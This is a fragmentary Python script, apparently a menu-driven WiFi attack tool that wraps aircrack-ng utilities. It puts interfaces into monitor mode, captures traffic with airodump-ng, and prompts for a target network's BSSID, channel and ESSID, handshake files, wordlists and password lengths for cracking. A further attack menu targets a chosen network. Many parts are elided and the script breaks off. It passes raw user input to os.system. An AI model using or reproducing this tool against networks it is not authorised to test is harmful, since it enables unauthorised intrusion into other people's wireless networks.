...
""")
    ...
    var = int(input(""))
    if var == 1 :
        print("Enter the interface:(Default(wlan0/wlan1))")
        interface = input("")
        order = "airmon-ng start {} && airmon-ng check kill".format(interface)
        geny  = os.system(order)
        intro()
    elif var == 2 :
        print("Enter the interface:(Default(wlan0mon/wlan1mon))")
        interface = input("")
        ...
        order     = "airodump-ng {} -M".format(interface)
        print("When Done Press CTRL+c")
        print("Note: Under Probe it might be Passwords So copy them to the worlist file")
        ...
        geny      = os.system(order)
        print("Enter the bssid of the target?")
        bssid     = str(input(""))
        print("Enter the channel of the network?")
        channel   = int(input())
...
""")
        ...
        if  os.path.exists("/usr/share/wordlists/rockyou.txt")==True:
            print("Enter the path of the handshake file ?")
            path = str(input(""))
        ...
        print("Enter the essid of the network ?(Be careful when you type it and use 'the name of the network') ")
        essid = str(input(""))
        print(" the path of the handshake file ?")
        path = str(input(""))
        print("Enter the minimum length of the password (8/64)?")
        mini = int(input(""))
        print("Enter the maximum length of the password (8/64)?")
        max  = int(input(""))
        print("""
---------------------------------------------------------------------------------------
...
""")
        ...
        print("Enter the path of the output file?")
        path = str(input(""))
        print("Enter what you want the password contain ?")
        password = str(input(""))
...
""")
        ...
        attack = int(input(""))
        if attack == 1:
            print("Enter the interface to start ?(Default(Wlan0mon/Wlan1mon))")
            interface = str(input(""))
            print("the bssid of the network ?")
            bssid = str(input(""))
            ...
            print("Enter the interface to start ?(Default(Wlan0mon/Wlan1mon)")
            interface = str(input(""))
            print("Enter the bssid of the network ?")
            bssid = str(input(""))
            print("Enter the channel of the network ?")
            channel = int(input(""))
